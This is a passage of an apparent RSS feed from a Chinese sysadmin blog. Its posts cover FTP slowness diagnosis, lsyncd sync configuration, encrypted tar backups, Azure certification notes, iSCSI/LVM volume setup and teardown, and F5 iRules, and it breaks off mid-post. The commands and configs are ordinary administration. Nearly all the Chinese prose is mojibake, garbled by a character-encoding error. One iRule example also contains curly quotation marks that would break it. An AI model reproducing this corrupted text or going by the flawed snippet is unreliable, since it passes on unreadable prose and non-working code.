&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ˜¾ç¤ºä¸Šä¼ ä¸€å¼ å›¾ç‰‡èŠ±äº†383667msï¼Œæ²¡é“ç†å•Šï¼Œè¿™äº‹è‡ªå»ºçš„vsftpæœåŠ¡å™¨ï¼Œä¹Ÿæ²¡å¾€ossæ¡¶é‡Œæ”¾ä¸œè¥¿çš„ã€‚&lt;/p&gt;
&lt;h2 id=&#34;é—®é¢˜æ’æŸ¥&#34;&gt;é—®é¢˜æ’æŸ¥ï¼š&lt;/h2&gt;
&lt;p&gt;1ã€ç™»å½•åˆ°30.18ä¸Šé¢æŸ¥çœ‹vsftpdæ—¥å¿—ä¿¡æ¯ï¼Œè¿‡æ»¤display.jpgçš„ä¿¡æ¯ï¼Œå‘ç°ä¸Šä¼ ä¿¡æ¯æ˜¯æ­£å¸¸çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231208-ftp_slowly/2022-03-03_144142.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2ã€æŸ¥çœ‹prometheusç›‘æ§å„é¡¹æŒ‡æ ‡éƒ½å¾ˆæ­£å¸¸ã€‚å”¯æœ‰é‚£ä¸ªç‚¹çš„ioæ¯”å¹³æ—¶é«˜ä¸€ç‚¹ï¼Œä»€ä¹ˆåŸå› å¯¼è‡´æœªçŸ¥.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231208-ftp_slowly/2022-03-03_144626.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3ã€æŸ¥çœ‹vsftpdçš„å…¨éƒ¨æ—¥å¿—ä¿¡æ¯ï¼Œå‘ç°ftpæ¯åˆ°ä¸€ä¸ªç›®å½•å°±æ‰§è¡Œä¸€ä¸ªlistæ“ä½œï¼Œç”±äºproductç›®å½•ä¸‹é¢æ–‡ä»¶å¾ˆå¤šï¼Œæ‰€ä»¥è¿‡äº†6åˆ†é’Ÿæ‰ç›¸åº”ç»“æœï¼Œè¿™å°±æ˜¯å¯¼è‡´ftpæ…¢çš„åŸå› ã€‚
[å›¾ç‰‡]
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231208-ftp_slowly/2022-03-03_144753.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4ã€æ‰¾ç ”å‘éƒ¨é—¨éªŒè¯ï¼Œç»ˆäºå‘ç°ftpå…¬å…±ç»„ä»¶ï¼Œä»£ç é‡Œç¡®å®æœ‰è¿™ä¸ªlistæ“ä½œã€‚
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231208-ftp_slowly/2022-03-03_145030-17020249754001.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ€»ç»“ï¼šå¼€å‘ç—…å¾—ä¸æ¸…ï¼Œåˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨å±…ç„¶æ¯æ¬¡éƒ½åˆ·ä¸€ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå¤ªå¼±æ™ºäº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Lsync åŒæ­¥è½¯ä»¶çš„è¿ç”¨</title>
      <link>https://rendoumi.com/posts/20231208-lsync/</link>
      <pubDate>Fri, 08 Dec 2023 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231208-lsync/</guid>
      <description>&lt;p&gt;å…¬å¸ä½¿ç”¨æ™ºé½¿çš„æœºå™¨å´©äº†ï¼Œè¦åšæ•°æ®è¿ç§»ã€‚&lt;/p&gt;
&lt;p&gt;ç”±ä¸‰å°è€æœºå™¨è¿ç§»åˆ°ä¸‰å°æ–°kvmæœºå™¨&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬éœ€è¦æŠŠå…¶ä¸­ä¸€å°34.38çš„çš„ä¸œè¥¿å®æ—¶åŒæ­¥ä¸¤ä»½ï¼Œä¸€ä»½åˆ°30.18çš„glusterfsï¼Œä¸€ä»½åˆ°34.41çš„/data&lt;/p&gt;
&lt;p&gt;åŒæ—¶ä¹Ÿè¦æ³¨æ„30.18çš„GFSä¸­å·²ç»æœ‰ä¸¤ä¸ªè™šæœºæ–‡ä»¶ï¼Œ32.6å’Œ34.38çš„qcow2&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥lsyncåŠ¡å¿…è¦å°å¿ƒï¼Œä¸èƒ½åˆ é™¤å·²æœ‰æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;å®‰è£…å¾ˆç®€å•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install epel-release
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install lsyncd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;172.18.34.38ä¸Šé¢çš„/etc/lsyncd.confå¦‚ä¸‹ï¼ŒåŒæ­¥åˆ°ä¸¤ä¸ªç›®çš„åœ°ï¼š
æ³¨æ„ä¸‹é¢çš„å‚æ•°ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;maxProcesses = 2 # æœ¬æœºç”¨äºrsyncçš„è¿›ç¨‹æ•°&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;delete = &amp;lsquo;running&amp;rsquo; # åªåˆ é™¤lsyncå¯åŠ¨ä¹‹ååˆ é™¤çš„æ–‡ä»¶ï¼Œç›®çš„æ–‡ä»¶å¤¹ä¸­åŸæœ‰çš„æ–‡ä»¶ä¿å­˜&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;exclude = &amp;ldquo;upload&amp;rdquo; # ç¬¬äºŒä¸ªåŒæ­¥ä¸­æ’é™¤çš„ç›®å½•ï¼Œæ³¨æ„è¿™é‡Œæ˜¯åŒ¹é…å…¨è·¯å¾„ä¸­çš„éƒ¨åˆ†å­—ä¸²ï¼Œupload å¯ä»¥åŒ¹é…åˆ° /data/new/chatmsg/upload/allajl.jpgï¼Œå°±uploadç›®å½•ä¸‹æ–‡ä»¶å¤§ï¼Œæ‰€ä»¥æŠŠå®ƒæ’é™¤ã€‚**è¿™é‡Œçš„è§„åˆ™æ˜¯å’Œrsyncä¸­excludeçš„å†™æ³•ä¸åŒçš„ï¼ï¼ï¼**åªå–è·¯å¾„ä¸­çš„uploadå­—ä¸²å°±å¯ä»¥æ’é™¤ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;----
-- User configuration file for lsyncd.
--
-- Simple example for default rsync, but executing moves through on the target.
--
-- For more examples, see /usr/share/doc/lsyncd*/examples/
-- 
-- sync{default.rsyncssh, source=&amp;#34;/var/www/html&amp;#34;, host=&amp;#34;localhost&amp;#34;, targetdir=&amp;#34;/tmp/htmlcopy/&amp;#34;}

settings {
    logfile = &amp;#34;/var/log/lsyncd/lsyncd.log&amp;#34;,
    statusFile = &amp;#34;/var/log/lsyncd/lsyncd-status.log&amp;#34;,
    statusInterval = 5,
    maxProcesses = 2
}

sync {
    default.rsync,
    source = &amp;#34;/data/new&amp;#34;,
    target = &amp;#34;172.18.30.18::new&amp;#34;,
    delete = &amp;#39;running&amp;#39;,
    delay = 5,
    rsync     = {
        binary = &amp;#34;/usr/bin/rsync&amp;#34;,
        archive = true,
        compress = false,
        verbose   = true
    }
}

sync {
    default.rsync,
    source = &amp;#34;/data&amp;#34;,
    target = &amp;#34;172.18.34.41::new&amp;#34;,
    delete = &amp;#39;running&amp;#39;,
    exclude = &amp;#34;upload&amp;#34;,
    delay = 5,
    rsync     = {
        binary = &amp;#34;/usr/bin/rsync&amp;#34;,
        archive = true,
        compress = false,
        verbose   = true
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¯¹ç«¯rsyncdçš„é…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>LinuxåŠ å¯†å‹ç¼©taråŒ…</title>
      <link>https://rendoumi.com/posts/20231208-encrypt_tar/</link>
      <pubDate>Fri, 08 Dec 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231208-encrypt_tar/</guid>
      <description>&lt;p&gt;å®¡è®¡çš„éœ€æ±‚ï¼Œéœ€è¦å®šæœŸå¤‡ä»½æ–‡ä»¶ï¼Œä¸ºäº†å®‰å…¨èµ·è§ï¼Œè¿™äº›å‹ç¼©åŒ…éœ€è¦åŠ å¯†ä¿å­˜ï¼Œæ¢å¤çš„æ—¶å€™éœ€è¦å¯†ç æ‰èƒ½æ¢å¤ï¼š&lt;/p&gt;
&lt;p&gt;æŠŠç›®å½• 20231224å‹ç¼©è¿›åŠ å¯†åŒ…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar -zcvf - 20231224&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;openssl des3 -salt -k &amp;lt;password&amp;gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; dd &lt;span class=&#34;nv&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/backup/cdrom/20231224.tar.gz.des3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£å‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dd &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/backup/cdrom/20231224.tar.gz.des3 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;openssl des3 -d -k &amp;lt;password&amp;gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;tar zxf -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>ä»Šå¹´ä¸‹åŠå¹´çš„ä¸¤å¼ Azureè®¤è¯</title>
      <link>https://rendoumi.com/posts/20230921-azure_certificate/</link>
      <pubDate>Thu, 21 Sep 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230921-azure_certificate/</guid>
      <description>&lt;p&gt;åœ¨ä»Šå¹´å¾®è½¯çš„æŒ‘æˆ˜ä¸­æ‹¿äº†ä¸¤å¼ å…è´¹è€ƒå·ï¼Œè€ƒäº†AZ-104å’ŒAZ-305ï¼Œæäº†ä¸€å¼ ä¸“å®¶è¯ä¹¦ï¼Œä»Šå¹´çš„è€ƒè¯•åˆ°å¤´äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ˜å¹´ç”¨å…è´¹azureè€ƒè¯•æŠµæ‰£ç¨ï¼ŒçœŸæ˜¯ä¸€ä»¶å¥½äº‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230921152431697&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230921-azure_certificate/image-20230921152431697.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230921152857868&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230921-azure_certificate/image-20230921152857868.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Azureè®¤è¯az-104çš„è€ƒç‚¹</title>
      <link>https://rendoumi.com/posts/20230913-az-104/</link>
      <pubDate>Wed, 13 Sep 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230913-az-104/</guid>
      <description>&lt;p&gt;åœ¨ä»Šå¹´å¾®è½¯çš„æŒ‘æˆ˜ä¸­æ‹¿äº†ä¸¤å¼ å…è´¹è€ƒå·ï¼Œä¸€å¼ æ˜¯115$ï¼Œæ€•æµªè´¹å•Šï¼Œå°±åˆ†åˆ«è€ƒäº†AZ-104å’ŒAZ-305ï¼ŒåŸºæœ¬ä¸Šä½ 104èƒ½è¿‡ï¼Œ305å°±æ²¡æœ‰é—®é¢˜ï¼Œaz-104æŒºå¤šçŸ¥è¯†ç‚¹çš„ï¼Œæœ€è®¨åŒçš„æ˜¯æ­¥éª¤é¢˜ï¼Œä¸çŸ¥é“æ­»è®°é‚£äº›æ­¥éª¤æœ‰ä½•æ„æ€ï¼ŒæŠŠ104çš„çŸ¥è¯†è¦ç‚¹åˆ†åˆ—å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ResourceGroupçš„ Tagä¸ä¼šè¢«resourceç»§æ‰¿ï¼Œæ–°å»ºçš„policyåªé’ˆå¯¹æ–°æ·»åŠ å’Œæ›´æ–°çš„resourceç”Ÿæ•ˆï¼Œå¯¹æ²¡æœ‰ä¿®æ”¹çš„resourceä¸ç”Ÿæ•ˆï¼Œå¦å¤–éœ€è¦å…³æ³¨policyçš„definationæ˜¯åªé’ˆå¯¹resourceè¿˜æ˜¯åŒ…æ‹¬resource groups
Adds the specified tag and value when any resource missing this tag is created or updated. Existing resources can be remediated by triggering a remediation task. If the tag exists with a different value it will not be changed. Does not modify tags on resource groups.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Resize Availability Setä¸‹çš„VMï¼Œ éœ€è¦åœæ­¢Availability Setä¸‹æ‰€æœ‰çš„VM
If the VM you wish to resize is part of an availability set, then you must stop all VMs in the availability set before changing the size of any VM in the availability set.&lt;/p&gt;</description>
    </item>
    <item>
      <title>iscsiå·çš„é‡Šæ”¾</title>
      <link>https://rendoumi.com/posts/20230905-iscsi_volume_release/</link>
      <pubDate>Tue, 05 Sep 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230905-iscsi_volume_release/</guid>
      <description>&lt;p&gt;ä¸Šä¸€ç¯‡æˆ‘ä»¬ç”¨losetupå»ºäº†ä¸€ä¸ªiscsiå·ï¼Œç°åœ¨ç©ºé—´ä¸å¤Ÿäº†ï¼Œéœ€è¦é‡Šæ”¾æ‰ä¹‹å‰å»ºç«‹çš„iscsi-volumesçš„20Tç©ºé—´ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå»isciå·çš„å®¿ä¸»æœºæŸ¥çœ‹ä¸€ä¸‹&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;targetcli ls /
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230905-iscsi_volume_release/2021-06-14_214935.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¼€å§‹åˆ é™¤ï¼Œå…ˆåˆ é™¤backstoresï¼Œç„¶åæ˜¯iscsiï¼Œlvï¼Œvgï¼Œpv:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# targetcli /backstores/block delete vg-targetd:pvc-harbor
Deleted storage object vg-targetd:pvc-harbor.
# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-48
Deleted storage object vg-targetd:pvc-vis-18-31-48.
# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-49
Deleted storage object vg-targetd:pvc-vis-18-31-49.

# targetcli /iscsi delete iqn.2020-07.com.ddky:renhe-18-30-18
Deleted Target iqn.2020-07.com.ddky:renhe-18-30-18.
# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-48
Deleted Target iqn.2020-10.com.ddky:vis-18-31-48.
# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-49
Deleted Target iqn.2020-10.com.ddky:vis-18-31-49.

# lvs
  LV               VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  pvc-harbor       vg-targetd -wi-a----- 200.00g                                                    
  pvc-vis-18-31-48 vg-targetd -wi-a-----  80.00g                                                    
  pvc-vis-18-31-49 vg-targetd -wi-a-----  80.00g                                                    
# lvremove /dev/vg-targetd/pvc-harbor
Do you really want to remove active logical volume vg-targetd/pvc-harbor? [y/n]: y
  Logical volume &amp;#34;pvc-harbor&amp;#34; successfully removed
# lvremove /dev/vg-targetd/pvc-vis-18-31-48
Do you really want to remove active logical volume vg-targetd/pvc-vis-18-31-48? [y/n]: y
  Logical volume &amp;#34;pvc-vis-18-31-48&amp;#34; successfully removed
# lvremove /dev/vg-targetd/pvc-vis-18-31-49
Do you really want to remove active logical volume vg-targetd/pvc-vis-18-31-49? [y/n]: y
  Logical volume &amp;#34;pvc-vis-18-31-49&amp;#34; successfully removed

# vgremove vg-targetd
  Volume group &amp;#34;vg-targetd&amp;#34; successfully removed
# lvs
# vgs
# pvs
  PV         VG Fmt  Attr PSize  PFree 
  /dev/loop0    lvm2 ---  19.53t 19.53t

# pvremove /dev/loop0
  Labels on physical volume &amp;#34;/dev/loop0&amp;#34; successfully wiped.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸€æ•´å¥—ä¸‹æ¥ï¼ŒåŸºæœ¬éƒ½å¹²å‡€äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>iscsiå·çš„è¿œç¨‹æŒ‚è½½ä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20230801-iscsi_volume/</link>
      <pubDate>Tue, 01 Aug 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230801-iscsi_volume/</guid>
      <description>&lt;p&gt;å¦‚æœæœºå™¨çš„ç£ç›˜ç©ºé—´ä¸å¤Ÿï¼Œå¯ä»¥ç”¨iscsiæŠŠæœåŠ¡å™¨172.18.30.18ä¸Šé¢åˆ’å‡ºä¸€ç‰‡ç©ºé—´ï¼Œè¿œç¨‹æŒ‚ä¸Šæ¥ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼ŒæœåŠ¡å™¨ç”¨losetupçš„è¿™ç§åšæ³•æ˜¯ä¸ºäº†å°†æ¥k8sä¹Ÿå¯ä»¥è¿™æ ·ç”¨åŠ¨æ€iscsiå·&lt;/p&gt;
&lt;h1 id=&#34;æœåŠ¡å™¨ç«¯å®‰è£…&#34;&gt;æœåŠ¡å™¨ç«¯å®‰è£…&lt;/h1&gt;
&lt;p&gt;ç™»å½•172.18.30.18&lt;/p&gt;
&lt;p&gt;å®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y targetcli targetd&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”¨æ–‡ä»¶æ¥è™šæ‹ŸLVMå·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /glusterfs/iscsi-volumes/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç”Ÿæˆ20TBæ–‡ä»¶
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dd &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&#34;nv&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;k8s-iscsi-volumes.img &lt;span class=&#34;nv&#34;&gt;bs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1G &lt;span class=&#34;nv&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;LOOP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;losetup -f&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;losetup &lt;span class=&#34;nv&#34;&gt;$LOOP&lt;/span&gt; k8s-iscsi-volumes.img
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vgcreate vg-targetd &lt;span class=&#34;nv&#34;&gt;$LOOP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿®æ”¹targetd.yaml:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/target/targetd.yaml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;password: xxxxxxxx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# defaults below; uncomment and edit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# if using a thin pool, use &amp;lt;volume group name&amp;gt;/&amp;lt;thin pool name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# e.g vg-targetd/pool&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pool_name: vg-targetd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user: admin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssl: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;target_name: iqn.2020-04.com.ddky:renhe-18-30-18
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œè¿™ä¸ªæ–‡ä»¶ç”Ÿæˆåï¼Œå°±ä¸éœ€è¦æ”¹åŠ¨äº†ï¼Œå¦‚æœä»¥åtarget_nameå˜äº†ï¼Œä¹Ÿä¸ç”¨ç®¡ï¼Œä¹Ÿä¸éœ€è¦é‡å¯targetd&lt;/p&gt;
&lt;p&gt;å¯åŠ¨æœåŠ¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now targetd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼Œçœ‹çœ‹æ˜¾ç¤ºç»“æœ
pvdisplay
vgdisplay
lvdisplay
targetcli ls /&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼šlvdisplayç»“æœå’Œtargetcli ls /ç»“æœéƒ½æ˜¯ç©º&lt;/p&gt;</description>
    </item>
    <item>
      <title>F5åˆ©ç”¨iruleå¼ºè¡Œæ¤å…¥cookie</title>
      <link>https://rendoumi.com/posts/20230727-f5_irule_cookie/</link>
      <pubDate>Thu, 27 Jul 2023 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230727-f5_irule_cookie/</guid>
      <description>&lt;p&gt;F5-Bigipåˆ©ç”¨iruleå¼ºè¡Œç»™è¯·æ±‚æ¤å…¥Cookieçš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;p&gt;iruleæœ‰ä¸¤ç§åšæ³•å¯ä»¥è®©é“¾æ¥é‡å®šå‘&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP::redirect &amp;quot;http://redirect.domain.com[HTTP::uri]&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP::respond 302 Location &amp;quot;http://redirect.domain.com[HTTP::uri]&amp;quot; &amp;quot;locale&amp;quot; $cookie
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬äºŒç§æ–¹æ³•æ¥å¼ºè¡Œå¡è¿›cookie&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;when HTTP_REQUEST {
    if {[HTTP::host] equals â€œfind.domain.comâ€ and [HTTP::path] equals â€œ/â€ } {
        set local_cookie [HTTP::cookie value lg_locale]
        set cookie [format &amp;quot;locale=%s; path=/; domain=%s&amp;quot; $local_cookie &amp;quot;&amp;lt;cookiedomain&amp;gt;&amp;quot;]
        HTTP::respond 302 Location â€œhttp://redirect.domain.com[HTTP::uri]â€ â€œSet-Cookieâ€ $cookie
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»“æœï¼š
&lt;img alt=&#34;image-20230727133739834&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230727-f5_irule_cookie/image-20230727133739834.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>F5åˆ©ç”¨iruleé˜²çˆ¬è™«</title>
      <link>https://rendoumi.com/posts/20230727-f5_irule_t/</link>
      <pubDate>Thu, 27 Jul 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230727-f5_irule_t/</guid>
      <description>&lt;p&gt;F5-Bigipåˆ©ç”¨iruleé˜²æ­¢çˆ¬è™«çš„ä¸€æ³•ã€‚&lt;/p&gt;
&lt;p&gt;çˆ¬è™«çš„è¯·æ±‚ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /cms/rest.htm?method&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ddky.cms.search.recommend.h5.o2o&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;pageNo&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;pageSize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;6&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;shopId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;201790&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ordertypeId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;suite&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;searchType&lt;/span&gt;&lt;span 